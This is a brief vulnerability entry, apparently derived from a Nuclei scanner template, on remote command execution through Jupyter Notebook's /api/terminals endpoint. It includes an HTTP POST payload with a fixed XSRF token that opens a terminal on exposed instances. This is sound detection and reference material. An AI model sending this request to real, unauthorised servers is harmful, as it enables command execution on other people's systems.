# Vulnerability: Jupyter Notebook - Remote Command Execution
**Classification:** JUPYTER
**Source:** Nuclei Template (`jupyter-notebook-rce.yaml`)

## Description
Jupyter Notebook is an interactive Notebook, computer application is a web based visualization, Jupyter Notebook API/terminals path there are loopholes in the remote command execution.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /api/terminals HTTP/1.1
Host: {{Hostname}}
X-XSRFToken: 2|7a4faae0|819f5adf7edaef5e74502c9d0c75a604|1653492335
Cookie: _xsrf=2|7a4faae0|819f5adf7edaef5e74502c9d0c75a604|1653492335
```

